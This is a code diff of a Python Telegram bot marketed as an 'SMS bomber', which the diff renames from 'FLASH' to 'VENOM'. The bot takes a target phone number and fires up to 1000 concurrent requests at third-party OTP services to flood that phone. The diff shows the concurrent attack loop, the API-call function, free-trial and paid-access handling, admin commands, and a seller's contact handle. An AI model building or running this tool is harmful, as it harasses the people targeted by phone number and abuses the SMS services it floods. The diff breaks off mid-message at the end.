@@ -339,11 +339,11 @@ SPEED_PRESETS = {
         'description': 'Fast speed for quick attacks',
         'emoji': '🚀'
     },
-    5: {  # Ultra Fast (Flash Attack)
-        'name': '⚡💥 FLASH MODE',
+    5: {  # Ultra Fast (VENOM Attack)
+        'name': '⚡💥 VENOM MODE',
         'max_concurrent': 1000,
         'delay': 0.001,
-        'description': 'FLASH ATTACK - Maximum speed, all APIs at once',
+        'description': 'VENOM ATTACK - Maximum speed, all APIs at once',
         'emoji': '⚡💥'
     }
 }
@@ -2020,10 +2020,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     trial_allowed, reason = await can_user_use_trial(user_id)
     
     welcome_text = f"""
-╔════════════════════════════════════════════════╗
-║        ⚡💥 FLASH BOMBER BOT 💥⚡        ║
-║           ULTIMATE SMS BOMBER           ║
-╚════════════════════════════════════════════════╝
+╔════════════════════════════════════════════╗
+║        ⚡💥 VENOM BOMBER BOT 💥⚡        ║
+║           ULTIMATE SMS BOMBER              ║
+╚════════════════════════════════════════════╝
 
 👤 USER INFO:
 ├─ Name: {clean_first_name}
@@ -2038,8 +2038,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ├─ Trial Available: {"✅ Yes" if trial_allowed else "❌ No"}
 └─ Status: {reason}
 
-⚡ FLASH ATTACK FEATURES:
-├─ Speed: Level 5 (FLASH MODE)
+⚡ VENOM ATTACK FEATURES:
+├─ Speed: Level 5 (VENOM MODE)
 ├─ Strategy: All APIs fire simultaneously
 ├─ Concurrency: 1000 parallel requests
 ├─ Total APIs: {TOTAL_APIS}
@@ -2048,7 +2048,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📋 COMMANDS:
 ├─ /trial <number> - One-time free trial (60s)
 ├─ /mytrial - Check your trial status
-├─ /attack <number> <time> - Paid flash attack
+├─ /attack <number> <time> - Paid VENOM attack
 ├─ /speed <1-5> - Set speed (Paid users only)
 ├─ /stop - Stop current attack
 ├─ /stats - View statistics
@@ -2064,7 +2064,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 💰 FOR FULL ACCESS:
 Contact: @Venompratap
 
-📡 STATUS: ✅ ONLINE | ⚡ READY FOR FLASH ATTACK
+📡 STATUS: ✅ ONLINE | ⚡ READY FOR VENOM ATTACK
 """
     
     await update.message.reply_text(welcome_text)
@@ -2092,9 +2092,9 @@ async def mytrial(update: Update, context: ContextTypes.DEFAULT_TYPE):
     status_text = "AVAILABLE" if trial_allowed else "NOT AVAILABLE"
     
     trial_status_text = f"""
-╔════════════════════════════════════════╗
-║          🎁 YOUR TRIAL STATUS         ║
-╚════════════════════════════════════════╝
+╔═══════════════════════════════════════╗
+║          🎁 YOUR TRIAL STATUS        ║
+╚═══════════════════════════════════════╝
 
 👤 USER INFORMATION:
 ├─ ID: {user_id}
@@ -2112,10 +2112,10 @@ async def mytrial(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ├─ Reason: {reason}
 └─ Duration: 60 seconds (One-time only)
 
-⚡ FLASH ATTACK INFO:
+⚡ VENOM ATTACK INFO:
 ├─ Total APIs: {TOTAL_APIS}
 ├─ Max OTPs/sec: {TOTAL_APIS * 10 if TOTAL_APIS > 0 else 0}
-└─ Mode: FLASH ATTACK (Level 5)
+└─ Mode: VENOM ATTACK (Level 5)
 
 ⚠️ IMPORTANT NOTES:
 """
@@ -2163,7 +2163,7 @@ async def trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"""
 ╔═══════════════════════╗
-║     ❌ TRIAL DENIED     ║
+║     ❌ TRIAL DENIED  ║
 ╚═══════════════════════╝
 
 Reason: {reason}
@@ -2189,15 +2189,15 @@ Reason: {reason}
     if not context.args or len(context.args) < 1:
         await update.message.reply_text(
             """
-╔════════════════════════════════════════╗
-║        🎁 FREE FLASH TRIAL         ║
-╚════════════════════════════════════════╝
+╔════════════════════════════════════╗
+║        🎁 FREE VENOM TRIAL         ║
+╚════════════════════════════════════╝
 
 Usage: /trial <phone_number>
 
-⚡ FLASH ATTACK FEATURES:
+⚡ VENOM ATTACK FEATURES:
 ├─ Duration: 60 seconds (1 minute)
-├─ Speed: FLASH MODE (Level 5)
+├─ Speed: VENOM MODE (Level 5)
 ├─ Strategy: All APIs fire at once
 ├─ Limit: ONE TIME ONLY
 └─ After trial: PERMANENTLY BLOCKED
@@ -2228,9 +2228,9 @@ Example: /trial 9876543210
     if TOTAL_APIS == 0:
         await update.message.reply_text(
             """
-╔═══════════════════════╗
+╔═════════════════════════╗
 ║  ⚡ NO APIs CONFIGURED  ║
-╚═══════════════════════╝
+╚═════════════════════════╝
 
 APIs are not configured yet.
 
@@ -2242,20 +2242,20 @@ Contact admin for support: @Venompratap
     # IMMEDIATELY mark trial as used and BLOCK it
     await mark_trial_used(user_id)
     
-    # Set speed to level 5 for flash attack
-    flash_settings = {
+    # Set speed to level 5 for VENOM attack
+    VENOM_settings = {
         'speed_level': 5,
         'max_concurrent': SPEED_PRESETS[5]['max_concurrent'],
         'delay': SPEED_PRESETS[5]['delay']
     }
-    await set_user_speed_settings(user_id, flash_settings)
+    await set_user_speed_settings(user_id, VENOM_settings)
     
-    # Set flash attack parameters
+    # Set VENOM attack parameters
     duration = 60  # 1 minute for trial
     current_time = datetime.now()
     end_time = current_time + timedelta(seconds=duration)
     
-    # Initialize flash attack session
+    # Initialize VENOM attack session
     context.user_data['attacking'] = True
     context.user_data['target_phone'] = phone
     context.user_data['attack_duration'] = duration
@@ -2264,25 +2264,25 @@ Contact admin for support: @Venompratap
     context.user_data['total_requests'] = 0
     context.user_data['successful_requests'] = 0
     context.user_data['failed_requests'] = 0
-    context.user_data['speed_settings'] = flash_settings
+    context.user_data['speed_settings'] = VENOM_settings
     context.user_data['is_trial_attack'] = True
     
     # Get updated trial info
     updated_trial_info = await get_user_trial_info(user_id)
     
-    # Create initial flash attack message
+    # Create initial VENOM attack message
     status_message = f"""
-╔════════════════════════════════════════╗
-║      ⚡💥 FLASH ATTACK STARTED     ║
-╚════════════════════════════════════════╝
+╔═════════════════════════════════════╗
+║      ⚡💥 VENOM ATTACK STARTED     ║
+╚═════════════════════════════════════╝
 
 🎯 TARGET: {phone}
 ⏱️ DURATION: {duration} seconds (1 minute)
-⚡ MODE: FLASH ATTACK (TRIAL)
+⚡ MODE: VENOM ATTACK (TRIAL)
 📅 STARTED: {current_time.strftime('%H:%M:%S')}
 
-⚡ FLASH CONFIGURATION:
-├─ Speed: FLASH MODE (Level 5)
+⚡ VENOM CONFIGURATION:
+├─ Speed: VENOM MODE (Level 5)
 ├─ Strategy: All APIs fire simultaneously
 ├─ Concurrency: 1000 parallel requests
 ├─ Total APIs: {TOTAL_APIS}
@@ -2300,7 +2300,7 @@ Contact admin for support: @Venompratap
 └─ Will stop: After 60 seconds
 
 ⚠️ IMPORTANT:
-This is your ONE-TIME FREE FLASH ATTACK!
+This is your ONE-TIME FREE VENOM ATTACK!
 After this, trial access will be PERMANENTLY BLOCKED.
 
 📊 INITIAL STATS:
@@ -2318,11 +2318,11 @@ After this, trial access will be PERMANENTLY BLOCKED.
     context.user_data['requests_since_last_update'] = 0
     context.user_data['last_status_update'] = time.time()
     
-    # Start FLASH ATTACK
-    asyncio.create_task(run_flash_attack(update, context, phone, duration, flash_settings, is_trial=True))
+    # Start VENOM ATTACK
+    asyncio.create_task(run_VENOM_attack(update, context, phone, duration, VENOM_settings, is_trial=True))
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle the /attack command for FLASH ATTACK - Paid users only"""
+    """Handle the /attack command for VENOM ATTACK - Paid users only"""
     user_id = update.effective_user.id
     
     # Get user's clean name
@@ -2340,7 +2340,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(
                 f"""
 ╔═══════════════════════╗
-║   🎁 USE TRIAL FIRST   ║
+║ 🎁 USE TRIAL FIRST   ║
 ╚═══════════════════════╝
 
 You have a ONE-TIME FREE TRIAL available!
@@ -2359,7 +2359,7 @@ Use your free trial first:
             await update.message.reply_text(
                 f"""
 ╔═══════════════════════╗
-║    🔒 ACCESS DENIED    ║
+║  🔒 ACCESS DENIED    ║
 ╚═══════════════════════╝
 
 You have used your ONE-TIME trial.
@@ -2383,7 +2383,7 @@ Only paid access available now.
         await update.message.reply_text(
             """
 ╔═══════════════════════╗
-║  ⚡ ALREADY ATTACKING  ║
+║⚡ ALREADY ATTACKING  ║
 ╚═══════════════════════╝
 
 You already have an active attack.
@@ -2396,13 +2396,13 @@ Use /stop to stop it first.
     if not context.args or len(context.args) < 2:
         await update.message.reply_text(
             """
-╔════════════════════════════════════════╗
-║        ⚡💥 FLASH ATTACK COMMAND    ║
-╚════════════════════════════════════════╝
+╔══════════════════════════════════════╗
+║        ⚡💥 VENOM ATTACK COMMAND    ║
+╚══════════════════════════════════════╝
 
 Usage: /attack <number> <duration>
 
-⚡ FLASH ATTACK MODE:
+⚡ VENOM ATTACK MODE:
 ├─ Speed: Maximum (Level 5)
 ├─ Strategy: All APIs fire at once
 ├─ Concurrency: 1000 parallel requests
@@ -2449,7 +2449,7 @@ Limits:
         await update.message.reply_text(
             """
 ╔═══════════════════════╗
-║  ⚡ NO APIs CONFIGURED  ║
+║⚡ NO APIs CONFIGURED  ║
 ╚═══════════════════════╝
 
 APIs are not configured yet.
@@ -2459,19 +2459,19 @@ Contact admin for support: @Venompratap
         )
         return
     
-    # Get user speed settings (force level 5 for flash attack)
-    flash_settings = {
+    # Get user speed settings (force level 5 for VENOM attack)
+    VENOM_settings = {
         'speed_level': 5,
         'max_concurrent': SPEED_PRESETS[5]['max_concurrent'],
         'delay': SPEED_PRESETS[5]['delay']
     }
-    await set_user_speed_settings(user_id, flash_settings)
+    await set_user_speed_settings(user_id, VENOM_settings)
     
     # Calculate end time
     current_time = datetime.now()
     end_time = current_time + timedelta(seconds=duration)
     
-    # Initialize flash attack session
+    # Initialize VENOM attack session
     context.user_data['attacking'] = True
     context.user_data['target_phone'] = phone
     context.user_data['attack_duration'] = duration
@@ -2480,18 +2480,18 @@ Contact admin for support: @Venompratap
     context.user_data['total_requests'] = 0
     context.user_data['successful_requests'] = 0
     context.user_data['failed_requests'] = 0
-    context.user_data['speed_settings'] = flash_settings
+    context.user_data['speed_settings'] = VENOM_settings
     context.user_data['is_trial_attack'] = False
     
-    # Create initial flash attack message
+    # Create initial VENOM attack message
     status_message = f"""
-╔════════════════════════════════════════╗
-║      ⚡💥 FLASH ATTACK STARTED     ║
-╚════════════════════════════════════════╝
+╔═════════════════════════════════════╗
+║      ⚡💥 VENOM ATTACK STARTED     ║
+╚═════════════════════════════════════╝
 
 🎯 TARGET: {phone}
 ⏱️ DURATION: {duration} seconds
-⚡ MODE: FLASH ATTACK (PAID USER)
+⚡ MODE: VENOM ATTACK (PAID USER)
 📅 STARTED: {current_time.strftime('%H:%M:%S')}
 
 👤 USER STATUS:
@@ -2500,8 +2500,8 @@ Contact admin for support: @Venompratap
 ├─ Access: Unlimited attacks
 └─ Admin: @Venompratap
 
-⚡ FLASH CONFIGURATION:
-├─ Speed: FLASH MODE (Level 5)
+⚡ VENOM CONFIGURATION:
+├─ Speed: VENOM MODE (Level 5)
 ├─ Strategy: All APIs fire simultaneously
 ├─ Concurrency: 1000 parallel requests
 ├─ Total APIs: {TOTAL_APIS}
@@ -2527,13 +2527,13 @@ Contact admin for support: @Venompratap
     context.user_data['requests_since_last_update'] = 0
     context.user_data['last_status_update'] = time.time()
     
-    # Start FLASH ATTACK task
-    asyncio.create_task(run_flash_attack(update, context, phone, duration, flash_settings, is_trial=False))
+    # Start VENOM ATTACK task
+    asyncio.create_task(run_VENOM_attack(update, context, phone, duration, VENOM_settings, is_trial=False))
 
-# =============== FLASH ATTACK FUNCTIONS ===============
+# =============== VENOM ATTACK FUNCTIONS ===============
 
-async def flash_api_call(session: aiohttp.ClientSession, api: dict, phone: str, context: ContextTypes.DEFAULT_TYPE):
-    """Call a single API for flash attack"""
+async def VENOM_api_call(session: aiohttp.ClientSession, api: dict, phone: str, context: ContextTypes.DEFAULT_TYPE):
+    """Call a single API for VENOM attack"""
     try:
         url = api['url'].format(phone=phone)
         data = api['data'](phone) if callable(api['data']) else api['data']
@@ -2581,13 +2581,13 @@ async def flash_api_call(session: aiohttp.ClientSession, api: dict, phone: str, 
             'error': str(e)
         }
 
-async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str, duration: int, speed_settings: dict, is_trial: bool = False):
-    """Run FLASH ATTACK - All APIs at once with maximum speed"""
+async def run_VENOM_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str, duration: int, speed_settings: dict, is_trial: bool = False):
+    """Run VENOM ATTACK - All APIs at once with maximum speed"""
     chat_id = context.user_data.get('status_chat_id')
     message_id = context.user_data.get('status_message_id')
     attack_start = context.user_data.get('attack_start')
     
-    # For flash attack, use maximum concurrency
+    # For VENOM attack, use maximum concurrency
     max_concurrent = 100
     connector = aiohttp.TCPConnector(limit=max_concurrent, limit_per_host=max_concurrent)
     timeout = aiohttp.ClientTimeout(total=5)
@@ -2595,7 +2595,7 @@ async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, p
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
         end_timestamp = time.time() + duration
         
-        # FLASH ATTACK LOOP
+        # VENOM ATTACK LOOP
         while time.time() < end_timestamp and context.user_data.get('attacking', False):
             # Calculate remaining time
             remaining = end_timestamp - time.time()
@@ -2613,10 +2613,10 @@ async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, p
                     if not context.user_data.get('attacking', False) or time.time() >= end_timestamp:
                         break
                     
-                    task = asyncio.create_task(flash_api_call(session, api, phone, context))
+                    task = asyncio.create_task(VENOM_api_call(session, api, phone, context))
                     tasks.append(task)
             
-            # Execute ALL tasks concurrently - FLASH ATTACK!
+            # Execute ALL tasks concurrently - VENOM ATTACK!
             if tasks:
                 try:
                     # Wait for all tasks with timeout
@@ -2635,9 +2635,9 @@ async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, p
                                 context.user_data['requests_since_last_update'] = context.user_data.get('requests_since_last_update', 0) + 1
                 
                 except Exception as e:
-                    logger.debug(f"Flash batch error: {e}")
+                    logger.debug(f"VENOM batch error: {e}")
             
-            # Update RPS every 0.5 seconds for flash attack
+            # Update RPS every 0.5 seconds for VENOM attack
             current_time = time.time()
             if current_time - context.user_data.get('last_rps_update', 0) >= 0.5:
                 elapsed = current_time - context.user_data['last_rps_update']
@@ -2647,12 +2647,12 @@ async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, p
                 context.user_data['last_rps_update'] = current_time
                 context.user_data['requests_since_last_update'] = 0
             
-            # Update status every 1 second for flash attack
+            # Update status every 1 second for VENOM attack
             if current_time - context.user_data.get('last_status_update', 0) >= 1:
-                await update_flash_status(context, chat_id, message_id, phone, duration, is_trial)
+                await update_VENOM_status(context, chat_id, message_id, phone, duration, is_trial)
                 context.user_data['last_status_update'] = current_time
             
-            # Minimal delay for flash attack
+            # Minimal delay for VENOM attack
             if time.time() < end_timestamp:
                 sleep_time = min(0.01, end_timestamp - time.time())
                 if sleep_time > 0:
@@ -2663,7 +2663,7 @@ async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, p
     elapsed = (attack_end - attack_start).seconds
     
     # Update final status
-    await update_flash_final_status(context, chat_id, message_id, phone, elapsed, speed_settings, is_trial)
+    await update_VENOM_final_status(context, chat_id, message_id, phone, elapsed, speed_settings, is_trial)
     
     # Log attack
     await log_attack(
@@ -2682,8 +2682,8 @@ async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, p
     # Clear attack flag
     context.user_data['attacking'] = False
 
-async def update_flash_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, phone: str, duration: int, is_trial: bool = False):
-    """Update flash attack status message"""
+async def update_VENOM_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, phone: str, duration: int, is_trial: bool = False):
+    """Update VENOM attack status message"""
     if not context.user_data.get('attacking', False):
         return
     
@@ -2704,7 +2704,7 @@ async def update_flash_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, 
         
         status_message = f"""
 ╔════════════════════════════════════════╗
-║        ⚡💥 FLASH ATTACK ACTIVE       ║
+║        ⚡💥 VENOM ATTACK ACTIVE       ║
 ╚════════════════════════════════════════╝
 
 🎯 TARGET: {phone}
@@ -2712,7 +2712,7 @@ async def update_flash_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, 
 📊 PROGRESS: {progress_bar} {progress_percent}%
 ⏳ REMAINING: {remaining}s
 
-⚡ FLASH STATS:
+⚡ VENOM STATS:
 ├─ REQUESTS: {context.user_data.get('total_requests', 0)}
 ├─ SUCCESS: {context.user_data.get('successful_requests', 0)}
 ├─ FAILED: {context.user_data.get('failed_requests', 0)}
@@ -2729,12 +2729,12 @@ async def update_flash_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, 
             text=status_message
         )
     except Exception as e:
-        logger.error(f"Failed to update flash status: {e}")
+        logger.error(f"Failed to update VENOM status: {e}")
 
-async def update_flash_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, phone: str, elapsed: int, speed_settings: dict, is_trial: bool = False):
-    """Update final flash attack status"""
+async def update_VENOM_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, phone: str, elapsed: int, speed_settings: dict, is_trial: bool = False):
+    """Update final VENOM attack status"""
     try:
-        status = "✅ FLASH COMPLETED" if context.user_data.get('attacking', False) else "🛑 FLASH STOPPED"
+        status = "✅ VENOM COMPLETED" if context.user_data.get('attacking', False) else "🛑 VENOM STOPPED"
         
         # Calculate success rate
         total = context.user_data.get('total_requests', 0)
@@ -2749,14 +2749,14 @@ async def update_flash_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id:
         
         final_message = f"""
 ╔════════════════════════════════════════╗
-║        ⚡💥 FLASH ATTACK RESULTS      ║
+║        ⚡💥 VENOM ATTACK RESULTS      ║
 ╚════════════════════════════════════════╝
 
 🎯 TARGET: {phone}
 ⏱️ DURATION: {elapsed} seconds
 📊 STATUS: {status}
 
-📈 FLASH PERFORMANCE:
+📈 VENOM PERFORMANCE:
 ├─ TOTAL REQUESTS: {total}
 ├─ SUCCESSFUL: {success}
 ├─ FAILED: {context.user_data.get('failed_requests', 0)}
@@ -2766,7 +2766,7 @@ async def update_flash_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id:
 └─ TOTAL APIS: {TOTAL_APIS}
 
 ⚡ ATTACK SUMMARY:
-├─ Mode: FLASH ATTACK (Maximum Speed)
+├─ Mode: VENOM ATTACK (Maximum Speed)
 ├─ Strategy: All APIs firing simultaneously
 ├─ Concurrency: 100+ parallel requests
 └─ Speed: Ultra High
@@ -2784,8 +2784,8 @@ async def update_flash_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id:
         else:
             final_message += f"""
 💡 NEXT ACTIONS:
-├─ ⚡ Use /attack for new flash attack
-├─ 🚀 Use /speed 5 for flash mode
+├─ ⚡ Use /attack for new VENOM attack
+├─ 🚀 Use /speed 5 for VENOM mode
 └─ 📊 Use /stats for full statistics
 """
         
@@ -2801,10 +2801,10 @@ async def update_flash_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id:
             text=final_message
         )
     except Exception as e:
-        logger.error(f"Failed to update flash final status: {e}")
+        logger.error(f"Failed to update VENOM final status: {e}")
 
 async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Stop current flash attack immediately"""
+    """Stop current VENOM attack immediately"""
     user_id = update.effective_user.id
     
     if not context.user_data.get('attacking', False):
@@ -2834,15 +2834,15 @@ async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Send immediate stop confirmation
     stop_message = f"""
-╔════════════════════════════════════════╗
-║      ⚡💥 FLASH ATTACK STOPPED     ║
-╚════════════════════════════════════════╝
+╔═════════════════════════════════════╗
+║      ⚡💥 VENOM ATTACK STOPPED     ║
+╚═════════════════════════════════════╝
 
 🎯 TARGET: {target_phone}
 ⏱️ DURATION: {elapsed} seconds
 📊 STATUS: STOPPED MANUALLY
 
-📈 FLASH STATS:
+📈 VENOM STATS:
 ├─ TOTAL REQUESTS: {total_requests}
 ├─ SUCCESSFUL: {successful_requests}
 ├─ FAILED: {failed_requests}
@@ -2850,7 +2850,7 @@ async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ├─ AVG RPS: {avg_rps:.1f}
 └─ TOTAL APIS: {TOTAL_APIS}
 
-✅ Flash attack has been completely stopped.
+✅ VENOM attack has been completely stopped.
 ⚡ No further OTPs will be sent.
 """
     
@@ -2869,8 +2869,8 @@ async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         stop_message += f"""
 💡 NEXT ACTIONS:
-├─ ⚡ Use /attack for new flash attack
-├─ 🚀 Use /speed 5 for flash mode
+├─ ⚡ Use /attack for new VENOM attack
+├─ 🚀 Use /speed 5 for VENOM mode
 └─ 📊 Use /stats for full statistics
 """
     
@@ -2924,7 +2924,7 @@ Speed control is available for PAID USERS only.
 ├─ Paid User: ❌ No
 
 ⚡ Trial Users Speed:
-Speed is fixed at Level 5 (FLASH MODE) for trial.
+Speed is fixed at Level 5 (VENOM MODE) for trial.
 
 💰 Contact Admin for Full Access:
 @Venompratap
@@ -2964,12 +2964,12 @@ Speed is fixed at Level 5 (FLASH MODE) for trial.
 ├─ 4️⃣ Level 4: 🚀 Fast
 │   ├─ Concurrent: 200
 │   └─ Delay: 0.05s
-└─ 5️⃣ Level 5: ⚡💥 FLASH MODE
+└─ 5️⃣ Level 5: ⚡💥 VENOM MODE
     ├─ Concurrent: 1000
     └─ Delay: 0.001s
 
 💡 Usage: /speed <level>
-📌 Example: /speed 5 for FLASH ATTACK
+📌 Example: /speed 5 for VENOM ATTACK
 """
         
         await update.message.reply_text(message)
@@ -2983,7 +2983,7 @@ Speed is fixed at Level 5 (FLASH MODE) for trial.
             await update.message.reply_text(
                 """
 ╔═══════════════════════╗
-║    ❌ INVALID LEVEL    ║
+║  ❌ INVALID LEVEL    ║
 ╚═══════════════════════╝
 
 Please use level 1-5:
@@ -2991,7 +2991,7 @@ Please use level 1-5:
 2️⃣ 🚶 Slow
 3️⃣ ⚡ Medium
 4️⃣ 🚀 Fast
-5️⃣ ⚡💥 FLASH MODE
+5️⃣ ⚡💥 VENOM MODE
 """
             )
             return
@@ -3009,7 +3009,7 @@ Please use level 1-5:
         await update.message.reply_text(
             f"""
 ╔═══════════════════════╗
-║     ✅ SPEED UPDATED   ║
+║   ✅ SPEED UPDATED   ║
 ╚═══════════════════════╝
 
 📊 New Settings Applied:
@@ -3037,7 +3037,7 @@ async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             """
 ╔═══════════════════════╗
-║  ❌ PERMISSION DENIED  ║
+║ ❌ PERMISSION DENIED  ║
 ╚═══════════════════════╝
 
 Only admins can use this command.
@@ -3065,7 +3065,7 @@ Only admins can use this command.
         await update.message.reply_text(
             f"""
 ╔═══════════════════════╗
-║     ✅ USER ADDED     ║
+║    ✅ USER ADDED     ║
 ╚═══════════════════════╝
 
 👤 User Details:
@@ -3076,7 +3076,7 @@ Only admins can use this command.
 ├─ Added by: {user_id}
 └─ Time: {datetime.now().strftime('%H:%M:%S')}
 
-✅ User can now use FLASH ATTACK with /attack
+✅ User can now use VENOM ATTACK with /attack
 ❌ Trial access is PERMANENTLY blocked
 💰 User has full paid access
 """
@@ -3092,7 +3092,7 @@ async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             """
 ╔═══════════════════════╗
-║  ❌ PERMISSION DENIED  ║
+║ ❌ PERMISSION DENIED  ║
 ╚═══════════════════════╝
 
 Only admins can use this command.
@@ -3115,7 +3115,7 @@ Only admins can use this command.
         await update.message.reply_text(
             f"""
 ╔═══════════════════════╗
-║     ✅ USER REMOVED   ║
+║    ✅ USER REMOVED   ║
 ╚═══════════════════════╝
 
 👤 User Details:
@@ -3123,7 +3123,7 @@ Only admins can use this command.
 ├─ Removed by: {user_id}
 └─ Time: {datetime.now().strftime('%H:%M:%S')}
 
-❌ User can no longer use FLASH ATTACK.
+❌ User can no longer use VENOM ATTACK.
 ❌ Both trial and paid access removed.
 ❌ User needs to be re-added for access.
 """
@@ -3140,7 +3140,7 @@ async def reset_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             """
 ╔═══════════════════════╗
-║  ❌ PERMISSION DENIED  ║
+║ ❌ PERMISSION DENIED  ║
 ╚═══════════════════════╝
 
 Only admins can use this command.
@@ -3164,7 +3164,7 @@ Only admins can use this command.
         await update.message.reply_text(
             f"""
 ╔═══════════════════════╗
-║   ✅ TRIAL RESET      ║
+║  ✅ TRIAL RESET      ║
 ╚═══════════════════════╝
 
 👤 User Details:
@@ -3191,7 +3191,7 @@ async def block_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             """
 ╔═══════════════════════╗
-║  ❌ PERMISSION DENIED  ║
+║ ❌ PERMISSION DENIED  ║
 ╚═══════════════════════╝
 
 Only admins can use this command.
@@ -3215,7 +3215,7 @@ Only admins can use this command.
         await update.message.reply_text(
             f"""
 ╔═══════════════════════╗
-║   ✅ TRIAL BLOCKED    ║
+║  ✅ TRIAL BLOCKED    ║
 ╚═══════════════════════╝
 
 👤 User Details:
@@ -3241,7 +3241,7 @@ async def unblock_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             """
 ╔═══════════════════════╗
-║  ❌ PERMISSION DENIED  ║
+║ ❌ PERMISSION DENIED  ║
 ╚═══════════════════════╝
 
 Only admins can use this command.
@@ -3265,7 +3265,7 @@ Only admins can use this command.
         await update.message.reply_text(
             f"""
 ╔═══════════════════════╗
-║   ✅ TRIAL UNBLOCKED  ║
+║  ✅ TRIAL UNBLOCKED  ║
 ╚═══════════════════════╝
 
 👤 User Details:
@@ -3291,7 +3291,7 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             """
 ╔═══════════════════════╗
-║  ❌ PERMISSION DENIED  ║
+║ ❌ PERMISSION DENIED  ║
 ╚═══════════════════════╝
 
 Only admins can use this command.
@@ -3305,9 +3305,9 @@ Only admins can use this command.
         await update.message.reply_text("📭 No authorized users found.")
         return
     
-    message = "╔════════════════════════════════════════╗\n"
-    message += "║          📋 AUTHORIZED USERS          ║\n"
-    message += "╚════════════════════════════════════════╝\n\n"
+    message = "╔══════════════════════════════════════╗\n"
+    message += "║          📋 AUTHORIZED USERS        ║\n"
+    message += "╚═════════════════════════════════════╝\n\n"
     
     for idx, (user_id, username, display_name, added_at, trial_count, last_trial, trial_blocked, is_paid) in enumerate(users, 1):
         status = "💰 PAID USER" if is_paid else "🎁 TRIAL USER"
@@ -3350,9 +3350,9 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     status = "🎁 Trial Available" if trial_allowed else "💰 Paid User" if trial_info['is_paid_user'] else "🔒 Trial Used & Blocked"
     
     stats_text = f"""
-╔════════════════════════════════════════╗
-║          📊 FLASH STATISTICS         ║
-╚════════════════════════════════════════╝
+╔═════════════════════════════════════╗
+║          📊 VENOM STATISTICS        ║
+╚═════════════════════════════════════╝
 
 👤 USER INFORMATION
 ├─ ID: {user_id}
@@ -3366,9 +3366,9 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ├─ Trial Available: {"✅ Yes" if trial_allowed else "❌ No"}
 └─ Reason: {reason}
 
-⚡ FLASH ATTACK INFO
+⚡ VENOM ATTACK INFO
 ├─ Total APIs: {TOTAL_APIS}
-├─ Max Speed: Level 5 (FLASH MODE)
+├─ Max Speed: Level 5 (VENOM MODE)
 ├─ Max Concurrency: 1000
 └─ Max OTPs/sec: {TOTAL_APIS * 10 if TOTAL_APIS > 0 else 0}
 
@@ -3412,23 +3412,23 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     status = "🎁 Trial Available" if trial_allowed else "💰 Paid User" if trial_info['is_paid_user'] else "🔒 Trial Used & Blocked"
     
     help_text = f"""
-╔════════════════════════════════════════╗
-║        ⚡💥 FLASH BOMBER HELP        ║
-╚════════════════════════════════════════╝
+╔═════════════════════════════════════╗
+║        ⚡💥 VENOM BOMBER HELP      ║
+╚═════════════════════════════════════╝
 
 👤 YOUR STATUS: {status}
 
-⚡ FLASH ATTACK COMMANDS:
+⚡ VENOM ATTACK COMMANDS:
 ├─ /trial <number> - One-time free trial (60s)
 ├─ /mytrial - Check your trial status
-├─ /attack <num> <time> - Paid flash attack
-├─ /speed <1-5> - Set speed (5=Flash Mode) - PAID ONLY
+├─ /attack <num> <time> - Paid VENOM attack
+├─ /speed <1-5> - Set speed (5=VENOM Mode) - PAID ONLY
 ├─ /stop - Stop current attack
 ├─ /stats - View statistics
 └─ /help - Show this menu
 
-🎯 FLASH ATTACK FEATURES:
-├─ Speed Level 5: FLASH MODE
+🎯 VENOM ATTACK FEATURES:
+├─ Speed Level 5: VENOM MODE
 ├─ Strategy: All APIs fire simultaneously
 ├─ Concurrency: 1000 parallel requests
 ├─ Total APIs: {TOTAL_APIS}
@@ -3500,9 +3500,9 @@ Only admins can use this command.
             await context.bot.send_message(
                 chat_id=user_id,
                 text=f"""
-╔════════════════════════════════════════╗
-║          📢 BROADCAST MESSAGE          ║
-╚════════════════════════════════════════╝
+╔═══════════════════════════════════════╗
